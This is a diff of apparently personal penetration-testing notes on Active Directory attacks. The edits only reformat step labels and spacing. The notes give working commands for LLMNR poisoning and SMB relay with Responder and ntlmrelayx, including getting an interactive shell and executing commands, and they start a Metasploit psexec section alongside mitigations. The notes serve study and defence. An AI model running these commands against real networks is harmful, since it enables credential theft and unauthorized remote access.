@@ -14,17 +14,18 @@
 		cant disable llmnr/nbt-ns
 			require network access control
 			require strong user password
+
 - SMB Relay
 	- relay hashes to specific machines and potentially gain access
 	- requirements - 
 		- smb signing must be turned off
 		- relayed user credentials must be admin
-	- Step1: Run Responder
+	- Step 1: Run Responder
 		- turn http and smb off(gedit Responder.conf)
-	- Step2: python Responder.py -I tun0 -rdw
-	- Step3: ntlmrelayx.py -tf targets.txt -smb2support
-	- Step4: An event occurs
-	- Step5: Win
+	- Step 2: python Responder.py -I tun0 -rdw
+	- Step 3: ntlmrelayx.py -tf targets.txt -smb2support
+	- Step 4: An event occurs
+	- Step 5: Win
 	- to look for disabled smb host(nmap --script=smb2-security-mode.nse -p445 (ip address))
 	- perform an interactive shell type ntlmrelayx.py -tf targets.txt -smb2support -i( look at the ipaddress and port then in another tab type nc <ipaddress> <port> )
 		- ntlmrelayx.py -tf targets.txt -smb2support -c "whoami" (to execute the command)
@@ -45,6 +46,7 @@
 		- Local admin restriction:
 			- Pro: Can prevent a lot of lateral movement
 			- Con: Potential increase in the amount of service desk tickets
+
 - Gaining Shell Access(using metasploit)
 	- search psexec
 	- use 10 (exploit/windows.smb/psexec)
